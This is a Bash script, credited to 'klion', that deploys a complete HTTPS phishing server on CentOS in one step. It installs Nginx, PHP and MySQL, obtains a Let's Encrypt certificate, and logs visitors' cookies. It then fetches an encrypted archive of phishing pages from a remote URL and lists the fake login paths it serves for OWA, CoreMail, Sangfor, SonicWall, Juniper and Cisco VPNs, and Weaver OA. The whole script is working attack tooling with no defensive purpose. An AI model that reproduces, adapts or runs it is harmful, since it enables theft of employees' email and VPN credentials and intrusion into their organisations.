#!/bin/bash

# Author: klion
# 2020.5.6

# 去vps上进行一些初始化操作
# passwd														# 改密码
# sed -i '2c HOSTNAME=WebSrv' /etc/sysconfig/network  			# 修改机器名
# echo "127.0.0.1  WebSrv" >> /etc/hosts	

# 接着,把 php-5.5.38.tar.gz 包传到vps上,放到和脚本同目录下
# shutdown -r now   											# 重启系统使之生效

# 之后,去域名(建议用全新域名)下随便添加一条A记录(比如,sp),指向VPS ip即可
# 脚本故意每一步都加了延迟,主要方便后续快速排查问题

# 最终会部署的环境,如下
# Python-2.7.11 + Nginx-1.12.1 + Mysql-5.5.61 + PHP-5.5.38 + HTTPS + 各种钓鱼页(需要自己事先准备打包压缩好[7z格式],并放至远程站点目录下)...


if [ $# -eq 0 ] ||  [ $# != 4 ] ;then
	echo -e "\n#########################################################################################################################"
	echo "#								                                                        #"
	echo "#     HTTPS钓鱼站一键部署脚本 Tested on CentOS release 6.8 (Final) 64bit	                                        #"
	echo "#  			       					                                                        #"
	echo "# 						         Author: klion 	                                                #"
	echo "#  			       			         2020.5.6	                                                #"
	echo "#                       					                                                        #"
	echo "#########################################################################################################################"
	echo "#          							                                                        #"
	echo "#     Usage:            					                                                        #"
	echo "#       /root/PhishingWebSrv.sh  您的域名   Mysql的root密码(随意)    钓鱼页面URL.7z 	               解压密码	        #"
	echo "#       /root/PhishingWebSrv.sh  \"sp.hi.org\" '81PtmLoDdsi@#402njgJ4G'  \"https://fileproxy.io/spoofpage.7z\" \"PaZahey873\" #"
	echo "#                       					                                                        #"
	echo -e "#########################################################################################################################\n"
    exit
fi

domain=$1
rootpwd=$2
url=$3
zippwd=$4
subdomain=`echo "${domain}" | awk -F "." {'print $2"."$3'}`
hname=`hostname`

# 检查当前系统的yum是否正常工作
yum install -y lrzsz >/dev/null 2>&1
if [ $? -eq 0 ];then
	echo -e "\n\e[92m请仔细确认域名的相关解析记录都已事先添加好且可正常解析 ! \e[0m"
	sleep 2
	echo -e "\e[92m请仔细确认 php-5.5.38.tar.gz 是否已经事先传到当前目录下 ! \e[0m\n"
	echo -e "====================================================================================\n"
	sleep 2
	echo -e "\e[92m本机YUM 工作正常! \e[0m"
else
	echo -e "\n\033[33m本机YUM工作异常,请检查后重试... \033[0m\n"
	exit
fi

# 判断权限
if [ `id -u` -ne 0 ];then
	echo -e "\n\033[33m请以 root 权限 运行该脚本! \033[0m\n"
	exit
fi

# 检查当前系统是否有Web端口被占用
yum install -y nc >/dev/null 2>&1
arr=(80 443 3306 9000)
for(( i=0;i<${#arr[@]};i++))
do
	nc -z -v -w 2 127.0.0.1 ${arr[i]} >/dev/null 2>&1
	if [ $? -eq 0 ];then
		echo -e "${arr[i]} 端口被占用,请kill掉相关进程后重试 !"
		exit
	fi
done;

# 编译安装Python2.7
sleep 3
yum groupinstall "Development tools" -y >/dev/null 2>&1
if [ $? -eq 0 ];then
	echo -e "\e[92mDevelopment tools 基础环境包已安装成功 ! \e[0m\n"
	echo -e "====================================================================================\n"
	yum install git wget curl zlib zlib-devel bzip2-devel openssl openssl-devel ncurses-devel sqlite-devel epel-release -y >/dev/null 2>&1
	if [ $? -eq 0 ];then
		echo -e "\e[92m开始编译安装 Python2.7 ! \e[0m\n"
		sleep 3
		echo -e "\e[94m常用依赖库已安装成功,准备下载Python-2.7.11.tgz,请稍后... \e[0m"
		sleep 3
		wget https://www.python.org/ftp/python/2.7.11/Python-2.7.11.tgz >/dev/null 2>&1
		if [ $? -eq 0 ];then
			sleep 3
			echo -e "\e[94mPython-2.7.11.tgz下载完成,准备编译安装,编译过程可能耗时较长(此处请不要随意Ctrl+C),请耐心等待... \e[0m"
			tar xf Python-2.7.11.tgz && cd Python-2.7.11 && ./configure --prefix=/usr/local >/dev/null 2>&1
			make >/dev/null 2>&1 && make install >/dev/null 2>&1 && cd
			if [ $? -eq 0 ];then
				echo -e "\e[94mPython 2.7 编译安装成功 ! \e[0m\n"
				rm -fr Python* && which "python2.7" >/dev/null 2>&1
				sleep 3
			else
				echo -e "Python 2.7 编译安装失败 ! 请检查后重试 !"
				exit
			fi
		else
			echo -e "Python-2.7.11.tgz下载失败,请检查后重试 ! "
			exit
		fi
	else
		echo -e "依赖库安装失败 ! 请检查后重试 !"
		exit
	fi
else
	echo -e "Development tools 环境包安装失败 ! 请仔细检查后重试 !"
	exit
fi

echo -e "====================================================================================\n"

# 编译安装 setuptools  + Pip
echo -e "\e[92m开始编译安装 Setuptools  + Pip ! \e[0m\n"
sleep 3
wget https://files.pythonhosted.org/packages/ff/d4/209f4939c49e31f5524fa0027bf1c8ec3107abaf7c61fdaad704a648c281/setuptools-21.0.0.tar.gz#sha256=bdf0b7660f6673868d60d929e267e583bddc0e9623c71197b1ad79610c2ebe93 >/dev/null 2>&1
if [ $? -eq 0 ];then
	echo -e "\e[94mSetuptools-21.0.0.tar.gz下载完成,准备编译安装,请耐心等待... \e[0m"
	sleep 3
	tar xf setuptools-21.0.0.tar.gz && cd setuptools-21.0.0 && python setup.py install >/dev/null 2>&1
	if [ $? -eq 0 ];then
		echo -e "\e[94mSetuptools 编译安装成功,准备下载pip-8.1.1.tar.gz,请耐心等待... \e[0m"
		cd && rm -fr setuptools* 
		sleep 3
		wget https://distfiles.macports.org/py-pip/pip-8.1.1.tar.gz >/dev/null 2>&1
		if [ $? -eq 0 ];then
			echo -e "\e[94m\nPip-8.1.1.tar.gz下载完成,准备编译安装,请耐心等待... \e[0m"
			sleep 3
			tar xf pip-8.1.1.tar.gz && cd pip-8.1.1 && python setup.py install >/dev/null 2>&1
			which "pip2.7" >/dev/null 2>&1
			if [ $? -eq 0 ];then
				echo -e "\e[94mPIP 编译安装成功 ! \e[0m\n"
				pip2.7 install virtualenv==16.7.9 >/dev/null 2>&1
				pip2.7 install --upgrade pip >/dev/null 2>&1
				cd && rm -fr pip*
				sleep 3
			else
				echo -e "PIP 编译安装失败 ! 请检查后重试 !"
				exit
			fi
		else
			echo -e "Setuptools-21.0.0.tar.gz下载失败,请检查后重试 ! "
			exit
		fi
	else
		echo -e "Setuptools 编译安装失败 ! 请检查后重试 !"
		exit
	fi
else
	echo -e "Setuptools-21.0.0.tar.gz下载失败,请检查后重试 ! "
	exit
fi

echo -e "====================================================================================\n"

# 编译安装nginx 1.12.1
echo -e "\e[92m开始编译安装 Nginx 1.12.1 ! \e[0m\n"
sleep 3
yum install pcre pcre-devel gcc gcc-c++ automake -y >/dev/null 2>&1
if [ $? -eq 0 ];then
	echo -e "\e[94mNginx相关依赖库安装成功 ! \e[0m"
	sleep 3
	# 用户不存在就自动创建
	id nginx >/dev/null 2>&1
	if [ $? != 0 ];then
		useradd -s /sbin/nologin -M nginx
	fi
	if [ $? -eq 0 ];then
		echo -e "\e[94mNginx服务用户添加成功,准备下载 nginx-1.12.1.tar.gz,请稍后... \e[0m"
		sleep 3
		wget http://nginx.org/download/nginx-1.12.1.tar.gz >/dev/null 2>&1
		if [ $? -eq 0 ];then
			echo -e "\e[94mNginx 下载成功,准备编译安装,请耐心等待... \e[0m"
			tar xf nginx-1.12.1.tar.gz && cd nginx-1.12.1
			./configure --prefix=/usr/local/nginx-1.12.1 --user=nginx --group=nginx --with-http_ssl_module --with-http_stub_status_module >/dev/null 2>&1 && make >/dev/null 2>&1 && make install >/dev/null 2>&1
			if [ $? -eq 0 ];then
				ln -s /usr/local/nginx-1.12.1/ /usr/local/nginx && /usr/local/nginx/sbin/nginx -v  >/dev/null 2>&1
				if [ $? -eq 0 ];then
					echo -e "\e[94mNginx 编译安装成功 ! \e[0m"
					cd && rm -fr nginx-1.12.1*
					sleep 3
				fi
			else
				echo -e "Nginx 编译安装失败,请检查后重试 !"
				exit
			fi
		else
			echo -e "Nginx 下载失败,请检查后重试 !"
			exit
		fi
	fi
else
	echo -e "Nginx 相关依赖库安装失败,请检查后重试 !"
	exit
fi

cat << \EOF > /usr/local/nginx/conf/nginx.conf
worker_processes  1;
events {
    worker_connections  1024;
}
http {
    include       mime.types;
    default_type  application/octet-stream;
    sendfile        on;
    keepalive_timeout  65;

    # log_format main '$remote_addr - $remote_user  [$time_local]  ' 
    # ' "$request"  $status  $body_bytes_sent  '
    # ' "$http_referer"  "$http_user_agent"  "$http_x_forwarded_for" $dm_cookie" ';
    
    # include extra/spoofer.conf; 
}
EOF

# 先检查配置文件语法
/usr/local/nginx/sbin/nginx -t >/dev/null 2>&1
if [ $? -eq 0 ] && [ -f "/usr/local/nginx/conf/nginx.conf" ] ;then
	echo -e "\e[94m/usr/local/nginx/conf/nginx.conf 配置修改成功 ! \e[0m"
	sleep 3
else
	echo -e "/usr/local/nginx/conf/nginx.conf 配置修改失败,请检查后重试 !"
	exit
fi

mkdir /usr/local/nginx/html/Falser
echo "Hi,Word" > /usr/local/nginx/html/Falser/index.html
mkdir /usr/local/nginx/conf/extra

# 解析变量问题
cat << EOF > /usr/local/nginx/conf/extra/spoofer.conf
server {
set \$dm_cookie "";
if (\$http_cookie ~* "(.+)(?:;|$)") {
set \$dm_cookie \$1;
}
listen 80;
server_name  ${domain} ${subdomain};
root   html/Falser;
location / {
index  index.html index.htm;
}
access_log logs/access_${domain}.log main;
error_page   500 502 503 504  /50x.html;
location = /50x.html {
root   html/Falser;
}
}
EOF

if [ $? -eq 0 ] && [ -d "/usr/local/nginx/html/Falser" ] && [ -d "/usr/local/nginx/conf/extra" ]; then
	sed -i 's/^\./\t/g' /usr/local/nginx/conf/extra/spoofer.conf
	if [ $? -eq 0 ] ;then
		echo -e "\e[94m/usr/local/nginx/conf/extra/spoofer.conf 配置修改成功 ! \e[0m"
		sleep 3
	fi
else
	echo -e "/usr/local/nginx/conf/extra/spoofer.conf 配置修改失败,请检查后重试 !"
	exit
fi

sed -i 's/\#\ //g' /usr/local/nginx/conf/nginx.conf
/usr/local/nginx/sbin/nginx -t >/dev/null 2>&1
if [ $? -eq 0 ] ;then
	echo -e "\e[94mNginx 配置文件语法正确 ! \e[0m"
	sleep 3
	/usr/local/nginx/sbin/nginx && nc -z -v -w 2 127.0.0.1 80 >/dev/null 2>&1
	if [ $? -eq 0 ] ;then
		echo -e "\e[94mNginx 服务启动成功 ! \e[0m"
		sleep 3
		echo "/usr/local/nginx/sbin/nginx" >> /etc/rc.local
		echo -e "\e[94mNginx 服务已写入系统自启动 ! \e[0m\n" && cd
		sleep 3
	fi
else
	echo -e "Nginx 配置文件语法错误,请检查后重试 !"
	exit
fi

echo -e "====================================================================================\n"

# 申请证书 [ 需要事先到到域名里添加好相应的解析记录,注意,同一个ip和域名不能请求的太频繁 ]
echo -e "\e[92m开始申请证书 ! \e[0m\n" && sleep 3
yum install python-pip -y >/dev/null 2>&1
yum install python-virtualenv -y >/dev/null 2>&1
if [ $? -eq 0 ] ;then
	pip2.7 install wheel >/dev/null 2>&1 && pip2.7 install zipp >/dev/null 2>&1 && pip2.7 install configparser >/dev/null 2>&1
	if [ $? -eq 0 ] ;then
		echo -e "\e[94mCertbot依赖py库安装成功 ! 准备下载Certbot,请稍后... \e[0m" && sleep 2
		git clone https://github.com/certbot/certbot.git >/dev/null 2>&1
		if [ $? -eq 0 ] ;then
			cd certbot
			./certbot-auto --help >/dev/null 2>&1
			if [ $? -eq 0 ] ;then
				./certbot-auto certonly --webroot --agree-tos -v -t --email ads@adv.com -w /usr/local/nginx/html/Falser/ -d $domain -q >/dev/null 2>&1
				if [ $? -eq 0 ] ;then
					echo -e "\e[94m证书申请成功 ! \e[0m"
					sleep 3
					cd && rm -fr certbot/
					openssl dhparam -out /etc/ssl/certs/dhparams.pem 2048 >/dev/null 2>&1
					if [ $? -eq 0 ] ;then
						echo -e "\e[94m密钥生成成功 ! \e[0m\n" && cd
						sleep 3
					fi
				else
					echo -e "证书申请失败,请检查后重试 !"
					exit
				fi
			fi
		fi
	else
		echo -e "Certbot依赖py库安装失败,请检查后重试 !"
		exit
	fi
fi

echo -e "====================================================================================\n"

# 安装配置mysql 5.5
echo -e "\e[92m开始安装配置 Mysql 5.5.61 ! \e[0m\n" && sleep 3
id mysql >/dev/null 2>&1
if [ $? != 0 ] ;then
	useradd mysql -s /sbin/nologin -M 
fi
if [ $? -eq 0 ] ;then
	echo -e "\e[94mMysql 服务用户创建成功,准备下载mysql-5.5.61-linux-glibc2.12-x86_64.tar.gz,包较大,耗时可能较长,请耐心等待... \e[0m"
	sleep 3
	wget http://mirrors.sohu.com/mysql/MySQL-5.5/mysql-5.5.61-linux-glibc2.12-x86_64.tar.gz >/dev/null 2>&1
	if [ $? -eq 0 ] ;then
		echo -e "\e[94mmysql-5.5.61-linux-glibc2.12-x86_64.tar.gz下载完成,开始进行初始化配置,请稍后... \e[0m"
		sleep 3
		tar xf mysql-5.5.61-linux-glibc2.12-x86_64.tar.gz
		mv mysql-5.5.61-linux-glibc2.12-x86_64 /usr/local/mysql-5.5.61
		ln -s /usr/local/mysql-5.5.61/ /usr/local/mysql
		/usr/local/mysql/scripts/mysql_install_db --basedir=/usr/local/mysql --datadir=/usr/local/mysql/data/ --user=mysql >/dev/null 2>&1
		if [ $? -eq 0 ] ;then
			echo -e "\e[94mMysql初始化配置成功,准备启动Mysql服务,请稍后... \e[0m"
			sleep 3
			chown -R mysql.mysql /usr/local/mysql/
			\cp /usr/local/mysql/support-files/my-small.cnf /etc/my.cnf
			if [ $? -eq 0 ] ;then
				/usr/local/mysql/bin/mysqld_safe --syslog & >/dev/null 2>&1 && sleep 3
				nc -z -v -w 2 127.0.0.1 3306 >/dev/null 2>&1
				if [ $? -eq 0 ] ;then
					echo -e "\e[94mMysql 服务启动成功! \e[0m" && sleep 3
					echo "/usr/local/mysql/bin/mysqld_safe &" >> /etc/rc.local
					if [ $? -eq 0 ] ;then
						echo -e "\e[94mMysql 服务已写入系统自启动 ! \e[0m"
						sleep 3
						echo "export PATH=$PATH:/usr/local/mysql/bin/" >> /etc/profile
						source /etc/profile
						if [ $? -eq 0 ] ;then
							echo -e "\e[94mMysql 已成功写入系统环境变量! \e[0m"
							sleep 3
							mysqladmin -uroot password "${rootpwd}"
							if [ $? -eq 0 ] ;then
								echo -e "\e[94mMysql root密码设置成功! \e[0m" && sleep 3
								mysql -uroot -p"${rootpwd}" -e "drop user ''@'localhost';"
								mysql -uroot -p"${rootpwd}" -e "drop user 'root'@'::1';"
								mysql -uroot -p"${rootpwd}" -e "drop user ''@'${hname}';"
								if [ $? -eq 0 ] ;then
									echo -e "\e[94mMysql 已全部配置完毕! \e[0m\n"
									cd && rm -fr mysql-5.5.61-linux-glibc2.12-x86_64.tar.gz
									sleep 6
								fi
							fi
						fi
					fi
				else
					echo -e "Mysql启动成功失败,请检查后重试 !"
					exit
				fi
			fi
		else
			echo -e "Mysql 初始化配置失败,请检查后重试 !"
			exit
		fi
	else
		echo -e "mysql-5.5.61-linux-glibc2.12-x86_64.tar.gz 下载失败,请检查后重试 !"
		exit
	fi
fi

echo -e "====================================================================================\n"

echo -e "\e[92m准备编译 PHP 5.5.38 ! \e[0m\n" && sleep 3

# php基础依赖库
yum install -y zlib-devel libxml2-devel libjpeg-devel freetype-devel libpng-devel gd-devel curl-devel libxslt-devel >/dev/null 2>&1
if [ $? -eq 0 ] ;then
	yum install openssl openssl-devel libmcrypt libmcrypt-devel mcrypt mhash mhash-devel -y >/dev/null 2>&1
	if [ $? -eq 0 ] ;then
		echo -e "\e[94mPhp 基础依赖库已安装成功! \e[0m"
		sleep 3 && cd
	fi
fi

# 编译安装libiconv库
wget https://ftp.gnu.org/pub/gnu/libiconv/libiconv-1.14.tar.gz >/dev/null 2>&1
if [ $? -eq 0 ] ;then
	echo -e "\e[94mlibiconv-1.14.tar.gz下载完成,准备编译,请稍后... \e[0m"
	sleep 3
	tar xf libiconv-1.14.tar.gz && cd libiconv-1.14 && ./configure --prefix=/usr/local/libiconv >/dev/null 2>&1 && make >/dev/null 2>&1 && make install >/dev/null 2>&1
	if [ $? -eq 0 ] ;then
		echo -e "\e[94mlibiconv 编译安装成功! \e[0m"
		cd && rm -fr libiconv-1.14* && sleep 3
	else
		echo -e "libiconv 编译安装失败,请检查后重试 !"
		exit
	fi
else
	echo -e "libiconv-1.14.tar.gz 下载失败,请检查后重试 !"
	exit
fi

# 编译安装libmcrypt库
wget ftp://mcrypt.hellug.gr/pub/crypto/mcrypt/attic/libmcrypt/libmcrypt-2.5.7.tar.gz >/dev/null 2>&1
if [ $? -eq 0 ] ;then
	echo -e "\e[94mlibmcrypt-2.5.7.tar.gz下载完成,准备编译,请稍后... \e[0m"
	sleep 3
	tar xf libmcrypt-2.5.7.tar.gz && cd libmcrypt-2.5.7 && ./configure -prefix=/usr/local >/dev/null 2>&1 && make >/dev/null 2>&1 && make install >/dev/null 2>&1
	if [ $? -eq 0 ] ;then
		echo -e "\e[94mlibmcrypt编译安装成功! \e[0m\n"
		cd && rm -fr libmcrypt-2.5.7* && sleep 3
	else
		echo -e "libmcrypt编译安装失败,请检查后重试 !"
		exit
	fi
else
	echo -e "libmcrypt-2.5.7.tar.gz下载失败,请检查后重试 !"
	exit
fi

echo -e "====================================================================================\n"

# 编译安装php5.5,需要事先把php-5.5.38.tar.gz传到自己的VPS上
tar xf php-5.5.38.tar.gz
cd php-5.5.38
./configure --prefix=/usr/local/php-5.5.38 --with-config-file-path=/usr/local/php-5.5.38/etc --with-mysql=/usr/local/mysql --with-mysqli=/usr/local/mysql/bin/mysql_config --with-pdo-mysql=/usr/local/mysql --with-iconv-dir=/usr/local/libiconv --with-freetype-dir --with-jpeg-dir --with-png-dir --with-zlib --with-libxml-dir=/usr --enable-xml --disable-rpath --enable-bcmath --enable-shmop --enable-sysvsem --enable-inline-optimization --with-curl --enable-mbregex --enable-fpm --enable-mbstring --with-mcrypt --with-gd --enable-gd-native-ttf --with-openssl --with-mhash --enable-pcntl --enable-sockets --with-xmlrpc --enable-soap --enable-short-tags --enable-static --with-xsl --with-fpm-user=nginx --with-fpm-group=nginx --enable-ftp --enable-opcache=no >/dev/null 2>&1

if [ $? -eq 0 ] ;then
	ln -s /usr/local/mysql/lib/libmysqlclient.so.18 /usr/lib64/
	if [ $? -eq 0 ] ;then
		echo -e "\e[94m开始编译php,此处编译过程可能比较耗时,请耐心等待...! \e[0m"
		sleep 3
		touch ext/phar/phar.phar && make >/dev/null 2>&1 && make install >/dev/null 2>&1
		if [ $? -eq 0 ] ;then
			echo -e "\e[94mPHP编译成功 ! \e[0m"
			ln -s /usr/local/php-5.5.38/ /usr/local/php
			cp php.ini-development /usr/local/php/etc/php.ini
			sleep 3
			cd && rm -fr php-5.5.38*
		else
			echo -e "Php编译失败,请检查后重试 !"
			exit
		fi
	fi
else
	echo -e "Php编译检查失败,请检查后重试 !"
	exit
fi

# 配置php-fpm,去除Nginx版本号
mkdir /app/logs/ -p
cp /usr/local/php/etc/php-fpm.conf.default /usr/local/php/etc/php-fpm.conf
cat << 'EOF' > /usr/local/php/etc/php-fpm.conf
[global]
pid = /app/logs/php-fpm.pid
error_log = /app/logs/php-fpm.log
log_level = error
rlimit_files = 32768
events.mechanism = epoll

[www]
user = nginx
group = nginx
listen = 127.0.0.1:9000
listen.owner = nginx
listen.group = nginx
pm = dynamic
pm.max_children = 1024
pm.start_servers = 16
pm.min_spare_servers = 5
pm.max_spare_servers = 20
pm.max_requests = 2048
slowlog = /app/logs/$pool.log.slow
request_slowlog_timeout = 10
php_admin_value[sendmail_path] = /usr/sbin/sendmail -t -i -f nginx@ngunx.com
EOF

if [ $? -eq 0 ] && [ -f "/usr/local/php/etc/php-fpm.conf" ] ;then
	echo -e "\e[94m/usr/local/php/etc/php-fpm.conf 配置修改成功 ! \e[0m"
	sleep 3
else
	echo -e "/usr/local/php/etc/php-fpm.conf 配置修改失败,请检查后重试 !"
	exit
fi

/usr/local/php/sbin/php-fpm && nc -z -v -w 2 127.0.0.1 9000 >/dev/null 2>&1
if [ $? -eq 0 ] ;then
	echo -e "\e[94mPhp-fpm 启动成功 ! \e[0m"
	sleep 3
	echo "/usr/local/php/sbin/php-fpm" >> /etc/rc.local
	echo -e "\e[94m已将Php-fpm 写入系统自启动 ! \e[0m"
	sleep 3
fi


# 配置nginx php解析
cat << EOF >  /usr/local/nginx/conf/extra/spoofer.conf

server {
    set \$dm_cookie "";
    if (\$http_cookie ~* "(.+)(?:;|$)") {
        set \$dm_cookie \$1;
    }   

    listen 443;
    server_name  ${domain} ${subdomain};
    root   html/Falser;

    ssl on;
    ssl_certificate /etc/letsencrypt/live/${domain}/fullchain.pem;
    ssl_certificate_key /etc/letsencrypt/live/${domain}/privkey.pem;
    ssl_dhparam /etc/ssl/certs/dhparams.pem;
    ssl_protocols SSLv3 TLSv1 TLSv1.1 TLSv1.2;
    ssl_ciphers HIGH:!aNULL:!MD5;

    location / {
        index  index.php index.html;
    }

    location ~ .*\.(php|php5)?$ {
        fastcgi_pass 127.0.0.1:9000;
        fastcgi_index index.php;
        include fastcgi.conf;
    }

    access_log logs/access_${domain}.log main;
    error_page   500 502 503 504  /50x.html;
    location = /50x.html {
        root   html/Falser;
    }
}
EOF

if [ $? -eq 0 ] && [ -f "/usr/local/nginx/conf/extra/spoofer.conf" ] ;then
	echo -e "\e[94mNginx 解析php配置成功! \e[0m\n"
	sleep 3
else
	echo -e "Nginx 解析php配置失败,请检查后重试 !"
	exit
fi

echo -e "====================================================================================\n"

/usr/local/nginx/sbin/nginx -t >/dev/null 2>&1
if [ $? -eq 0 ] ;then
	/usr/local/nginx/sbin/nginx -s quit && sleep 3 && /usr/local/nginx/sbin/nginx && nc -z -v -w 2 127.0.0.1 443 >/dev/null 2>&1
	if [ $? -eq 0 ] ;then
		echo -e "\e[94mNginx 服务重启成功! \e[0m"
		sleep 3
		chown -R nginx:nginx /usr/local/nginx/html/Falser/
		echo "<?php phpinfo();?>" > /usr/local/nginx/html/Falser/pazahei.php
		echo "尝试访问https://${domain}/pazahei.php 观察phpinfo是否正常! "
		sleep 3
	fi
else
	echo -e "Nginx 服务重启失败,请检查后重试 !"
	exit
fi

# 此处可以把事先准备好的钓鱼页面直接远程拉到网站根目录下,如果你用的是境外的VPS,且到国内的速度很一般,可能会明显感觉到https访问有点慢
echo -e "\n\e[92m开始从远程拉取钓鱼页面 ! \e[0m" && sleep 3
yum install -y p7zip >/dev/null 2>&1
if [ $? -eq 0 ] ;then
	# 先python -m SimpleHTTPServer 80 提供打包好的钓鱼页面的远程下载链接
	cd /usr/local/nginx-1.12.1/html/Falser/ && wget -O WebSpoof.7z $url >/dev/null 2>&1
	if [ $? -eq 0 ] ;then
		echo -e "\e[94m钓鱼页面拉取成功 ! \e[0m"
		7za x -p$zippwd WebSpoof.7z >/dev/null 2>&1 && chmod -R 777 ./*
		if [ $? -eq 0 ] ;then
			echo -e "\e[94m解压成功 ! \e[0m"
			sleep 3
			echo -e "\e[92mOWA 2007登录: 		https://${domain}/OWA2007CN \e[0m"
			echo -e "\e[92mOWA 2010登录: 		https://${domain}/OWA2010CN \e[0m"
			echo -e "\e[92mOWA 2013/2016登录: 	https://${domain}/OWA2013CN \e[0m"
			echo -e "\e[92mCoreMail 登录: 		https://${domain}/CoreMail \e[0m"
			echo -e "\e[92mSangfor Vpn登录: 	https://${domain}/SangforVpn \e[0m"
			echo -e "\e[92mSonicwall Vpn登录: 	https://${domain}/SonicwallVpn \e[0m"
			echo -e "\e[92mJuniper Vpn登录: 	https://${domain}/JuniperVpn \e[0m"
			echo -e "\e[92mCisco Vpn登录: 		https://${domain}/CiscoVpn \e[0m"
			echo -e "\e[92m泛微 OA登录: 		https://${domain}/OASystem \e[0m\n"
			sleep 3
			cd
		else
			echo -e "解压失败 !"
			exit
		fi
	else
		echo -e "钓鱼页面拉取失败 !"
		exit
	fi
fi

echo -e "====================================================================================\n"

# Nginx / Mysql / Php 安装路径
echo -e "\e[94mNginx安装目录: 	/usr/local/nginx-1.12.1\e[0m"
echo -e "\e[94mNginx Web目录: 	/usr/local/nginx-1.12.1/html\e[0m"
echo -e "\e[94mMysql安装目录: 	/usr/local/mysql-5.5.61\e[0m"
echo -e "\e[94mPHP  安装目录: 	/usr/local/php-5.5.38\e[0m"
echo -e "\e[94mHTTPS证书目录: 	/etc/letsencrypt/live/${domain}/\e[0m\n"
sleep 5

echo -e "====================================================================================\n"

# 各个服务配置文件路径
echo -e "\e[94mNginx服务配置文件: 	/usr/local/nginx-1.12.1/conf/nginx.conf\e[0m"
echo -e "\e[94mNginx访问日志文件: 	/usr/local/nginx-1.12.1/logs/access_${domain}.log\e[0m"
echo -e "\e[94mMysql服务配置文件: 	/etc/my.cnf\e[0m"
echo -e "\e[94mPHP配置文件: 		/usr/local/php-5.5.38/etc/php.ini\e[0m"
echo -e "\e[94mPhp-fpm配置文件: 	/usr/local/php-5.5.38/etc/php-fpm.conf\e[0m\n"
sleep 5

echo -e "====================================================================================\n"

# 各个服务启动脚本
echo -e "\e[94m启动Nginx: 	/usr/local/nginx-1.12.1/sbin/nginx\e[0m"
echo -e "\e[94m启动php-fpm:     /usr/local/php/sbin/php-fpm\e[0m"
echo -e "\e[94m启动Mysql: 	/usr/local/mysql-5.5.61/bin/mysqld_safe &\e[0m\n"
sleep 5

echo -e "====================================================================================\n"
echo -e "\e[92m恭喜,至此为止,整套HTTPS钓鱼站已全部部署完毕! \e[0m\n"


